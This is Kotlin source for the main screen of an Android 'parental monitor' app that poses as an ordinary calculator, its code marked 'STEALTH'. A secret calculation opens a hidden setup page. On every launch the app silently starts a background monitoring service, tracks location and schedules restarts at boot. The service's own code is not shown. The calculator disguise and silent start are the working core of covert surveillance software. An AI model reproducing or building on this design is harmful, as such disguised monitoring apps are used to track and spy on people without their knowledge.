package com.redeye.parentalmonitor.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.service.MonitoringService
import com.redeye.parentalmonitor.utils.CalculatorFormat
import com.redeye.parentalmonitor.utils.CalculatorState
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.BuildConfig
import com.redeye.parentalmonitor.utils.ServiceStart

class MainActivity : AppCompatActivity() {

    private lateinit var preferencesManager: PreferencesManager

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        outState.putString("currentNumber", currentNumber)
        outState.putString("previousNumber", previousNumber)
        outState.putString("operator", operator)
        outState.putString("lastExpression", lastExpression)
        outState.putBoolean("justCalculated", justCalculated)
        outState.putBoolean("entryReplaced", entryReplaced)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")

        setContentView(R.layout.activity_calculator)
        supportActionBar?.hide()
        try {
            window.statusBarColor = getColor(R.color.calc_background)
            window.navigationBarColor = getColor(R.color.calc_background)
            val controller = androidx.core.view.WindowCompat.getInsetsController(window, window.decorView)
            controller.isAppearanceLightStatusBars = true
            controller.isAppearanceLightNavigationBars = true
        } catch (_: Exception) {
        }
        initCalculator()
        if (savedInstanceState != null) {
            currentNumber = savedInstanceState.getString("currentNumber", "")
            previousNumber = savedInstanceState.getString("previousNumber", "")
            operator = savedInstanceState.getString("operator", "")
            lastExpression = savedInstanceState.getString("lastExpression", "")
            justCalculated = savedInstanceState.getBoolean("justCalculated", false)
            entryReplaced = savedInstanceState.getBoolean("entryReplaced", false)
            updateCalculatorDisplay()
        }
        val appCtx = applicationContext
        try {
            com.redeye.parentalmonitor.utils.Background.runCritical {
                try {
                    PreferencesManager.refreshInstance(appCtx)
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "refreshInstance failed during startup", e)
                }
                try {
                    preferencesManager = PreferencesManager.getInstance(appCtx)
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "PreferencesManager init failed during startup", e)
                }
                try {
                    startMonitoringInBackground()
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "Monitoring start failed during startup", e)
                }
            }
        } catch (_: Exception) {
        }
    }

    override fun onResume() {
        super.onResume()
        refreshForegroundTypes()
    }

    private fun refreshForegroundTypes() {
        try {
            if (!MonitoringService.isRunning) return
            val intent = Intent(this, MonitoringService::class.java).apply {
                action = MonitoringService.ACTION_REFRESH_FGS
            }
            ServiceStart.startForeground(this, intent)
        } catch (_: Exception) {
        }
    }

    // ═══════════════════════════════════════════════════════════
    // CALCULATOR FUNCTIONS (RELEASE MODE - STEALTH)
    // ═══════════════════════════════════════════════════════════

    private var calculatorDisplay: android.widget.TextView? = null
    private var calculatorHistory: android.widget.TextView? = null
    private val calcState = CalculatorState()
    private var currentNumber: String
        get() = calcState.currentNumber
        set(value) { calcState.currentNumber = value }
    private var operator: String
        get() = calcState.operator
        set(value) { calcState.operator = value }
    private var previousNumber: String
        get() = calcState.previousNumber
        set(value) { calcState.previousNumber = value }
    private var lastExpression: String
        get() = calcState.lastExpression
        set(value) { calcState.lastExpression = value }
    private var justCalculated: Boolean
        get() = calcState.justCalculated
        set(value) { calcState.justCalculated = value }
    private var entryReplaced: Boolean
        get() = calcState.entryReplaced
        set(value) { calcState.entryReplaced = value }

    private fun initCalculator() {
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Initializing Calculator UI")
        calculatorDisplay = findViewById(R.id.calculatorDisplay)
        calculatorHistory = findViewById(R.id.calculatorHistory)
        calculatorDisplay?.let {
            try {
                androidx.core.widget.TextViewCompat.setAutoSizeTextTypeUniformWithConfiguration(
                    it, 28, 64, 2, android.util.TypedValue.COMPLEX_UNIT_SP
                )
            } catch (_: Exception) {
            }
        }

        // Number buttons
        val digitViews = listOf(R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9)
        digitViews.forEachIndexed { index, viewId ->
            findViewById<android.widget.Button>(viewId)?.setOnClickListener { appendNumber(index.toString()) }
        }
        findViewById<android.widget.Button>(R.id.btnDot)?.setOnClickListener { appendNumber(".") }

        // Operator buttons
        findViewById<android.widget.Button>(R.id.btnPlus)?.setOnClickListener { setOperator("+") }
        findViewById<android.widget.Button>(R.id.btnMinus)?.setOnClickListener { setOperator("−") }
        findViewById<android.widget.Button>(R.id.btnMultiply)?.setOnClickListener { setOperator("×") }
        findViewById<android.widget.Button>(R.id.btnDivide)?.setOnClickListener { setOperator("÷") }

        // Function buttons
        findViewById<android.widget.Button>(R.id.btnEquals)?.setOnClickListener { calculate() }
        findViewById<android.widget.Button>(R.id.btnClear)?.setOnClickListener { clear() }
        findViewById<android.widget.Button>(R.id.btnBackspace)?.setOnClickListener { backspace() }
        findViewById<android.widget.Button>(R.id.btnToggleSign)?.setOnClickListener { toggleSign() }
        findViewById<android.widget.Button>(R.id.btnPercent)?.setOnClickListener { percent() }

        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Calculator initialized")
    }

    private fun appendNumber(number: String) {
        calcState.appendNumber(number)
        updateCalculatorDisplay()
    }

    @JvmName("setOperatorFromButton")
    private fun setOperator(op: String) {
        calcState.setOperator(op)
        updateCalculatorDisplay()
    }

    private fun calculate() {
        if (calcState.calculate()) {
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
            updateCalculatorDisplay()
            openSetupPage()
            return
        }
        updateCalculatorDisplay()
    }


    private fun backspace() {
        calcState.backspace()
        updateCalculatorDisplay()
    }

    private fun clear() {
        calcState.clear()
        updateCalculatorDisplay()
    }

    private fun toggleSign() {
        calcState.toggleSign()
        updateCalculatorDisplay()
    }

    private fun percent() {
        calcState.percent()
        updateCalculatorDisplay()
    }

    private fun updateCalculatorDisplay() {
        calculatorDisplay?.text = when {
            currentNumber.isNotEmpty() -> CalculatorFormat.displayNumber(currentNumber)
            previousNumber.isNotEmpty() -> CalculatorFormat.displayNumber(previousNumber)
            else -> "0"
        }
        calculatorHistory?.text = when {
            justCalculated -> CalculatorFormat.history(lastExpression)
            operator.isNotEmpty() && currentNumber.isNotEmpty() && currentNumber != "-" ->
                "${CalculatorFormat.displayNumber(previousNumber)} $operator ${CalculatorFormat.displayNumber(currentNumber)}"
            operator.isNotEmpty() -> "${CalculatorFormat.displayNumber(previousNumber)} $operator"
            else -> ""
        }
    }

    private fun openSetupPage() {
        try {
            startActivity(Intent(this, SetupActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Failed to open setup", e)
            try {
                Toast.makeText(this, getString(R.string.msg_open_setup_failed, e.message ?: ""), Toast.LENGTH_SHORT).show()
            } catch (_: Exception) {
            }
        }
    }

    private fun startMonitoringInBackground() {
        try {
            try {
                preferencesManager = PreferencesManager.getInstance(applicationContext)
            } catch (_: Exception) {
            }
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
            if (!preferencesManager.isConfigured()) {
                if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
                try {
                    MessageScheduler.scheduleBootRestart(this)
                } catch (_: Exception) {
                }
                return
            }

        if (!hasAllPermissions()) {
            if (BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Permissions missing - staying silent, grant via Setup")
            try {
                MessageScheduler.scheduleBootRestart(this)
            } catch (_: Exception) {
            }
            return
        }

        // Start monitoring service silently
        if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
            return
        }
        if (!hasBackgroundLocation()) {
            if (BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Background location missing - starting anyway with degraded location, grant via Setup")
        }
        if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
            try {
                startMonitoringService()
                if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
            } catch (e: Exception) {
                if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
                try {
                    MessageScheduler.scheduleBootRestart(this)
                } catch (_: Exception) {
                }
            }
        } else {
            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring already running")
        }
        } catch (_: Exception) {
        }
    }

    private fun hasAllPermissions(): Boolean {
        return com.redeye.parentalmonitor.utils.AppPermissions.hasAll(this)
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun startMonitoringService() {
        if (BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Creating service intent...")
        val intent = Intent(this, MonitoringService::class.java).apply {
            action = MonitoringService.ACTION_START_MONITORING
        }

        if (BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Starting service...")
        try {
            ServiceStart.startForeground(this, intent)
            if (BuildConfig.DEBUG) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.i("MainActivity", "Started as foreground service")
                } else {
                    android.util.Log.i("MainActivity", "Started as regular service")
                }
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Failed to start service", e)
            throw e
        }
    }

}
